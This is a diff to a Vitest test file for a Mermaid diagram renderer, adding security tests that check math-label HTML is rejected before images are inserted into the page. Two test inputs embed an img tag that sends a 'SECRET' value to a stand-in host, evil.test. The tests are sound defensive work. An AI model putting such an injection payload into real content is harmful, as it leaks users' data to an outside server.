@@ -84,11 +84,37 @@ it("continues rendering resource-free metadata", async () => {
   expect(draw).toHaveBeenCalledOnce();
 });
 
-it("preserves readable source when math labels require foreignObject", async () => {
+it("preserves readable math source without drawing unsupported labels", async () => {
   const render = vi.spyOn(mermaid, "render");
   const result = await renderMermaid("sequenceDiagram\n Alice->>Bob: $$x^2$$", false);
-  expect(render).toHaveBeenCalledOnce();
-  const generated = await render.mock.results[0].value;
-  expect(generated.svg).toContain("foreignObject");
+  expect(render).not.toHaveBeenCalled();
   expect(result).toBeNull();
+});
+
+it.each([
+  'Alice->>Bob: $$x$$ <img src="https://evil.test/leak?d=SECRET">',
+  'Note over Alice: $$x$$ <img src="https://evil.test/leak?d=SECRET">',
+])("rejects math HTML before it inserts images into the document: %s", async (line) => {
+  const images: HTMLImageElement[] = [];
+  const observeImages = (records: MutationRecord[]) => {
+    for (const record of records) {
+      for (const node of record.addedNodes) {
+        if (!(node instanceof Element)) continue;
+        if (node instanceof HTMLImageElement) images.push(node);
+        images.push(...node.querySelectorAll("img"));
+      }
+    }
+  };
+  const observer = new MutationObserver(observeImages);
+  // Include Mermaid's temporary measurement nodes outside the render host.
+  observer.observe(document, { childList: true, subtree: true });
+  const draw = vi.spyOn(mermaid, "render");
+  try {
+    expect(await renderMermaid(`sequenceDiagram\n ${line}`, false)).toBeNull();
+    observeImages(observer.takeRecords());
+    expect(images.map((image) => image.getAttribute("src"))).toEqual([]);
+    expect(draw).not.toHaveBeenCalled();
+  } finally {
+    observer.disconnect();
+  }
 });
